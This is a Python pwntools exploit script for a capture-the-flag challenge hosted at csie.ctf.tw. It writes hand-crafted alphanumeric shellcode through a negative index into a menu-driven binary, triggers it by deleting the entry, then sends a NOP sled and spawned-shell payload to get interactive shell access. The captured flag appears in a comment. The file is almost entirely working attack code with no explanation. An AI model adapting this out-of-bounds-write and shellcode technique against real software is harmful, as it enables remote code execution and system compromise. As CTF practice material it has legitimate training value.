from pwn import *

#FLAG{Enjoy_sh3llc0d1ng_47_Chr1stm4s_*_*_^_^_>_<}

host = 'csie.ctf.tw'
port = 10139
#host = '127.0.0.1'
#port = 4000
y = remote(host,port)

def add(name , idx):
    y.sendafter('choice :','1\n')
    y.sendafter('Index :',str(idx)+'\n')
    y.sendafter('Name :',name+'\n')

def dle(idx):
    y.sendafter(':','3\n')
    y.sendafter(':',str(idx)+'\n')


p = asm('pop ecx;pop ecx;')
p += asm('push 0x41;pop eax;xor al , 0x41;push eax;pop ebx')
p += asm('dec eax;xor BYTE PTR [ecx+0x53],al;xor BYTE PTR [ecx+0x54],al')
p += asm('push 0x4d;pop eax;xor BYTE PTR [ecx+0x54],al')
p += asm('push 0x7a;pop edx;push 0x41;pop eax;xor al , 0x41;inc eax;inc eax;inc eax')
p += asm('.byte 0x75;.byte 0x30')

p2 = asm('.byte 0x32;' * 5)

print p
add(p , -19)
add('a'*0x20,0)
add(p2,1)
dle(-19)
y.sendline('\x90' * 0x60 + asm(shellcraft.sh()))
y.interactive()
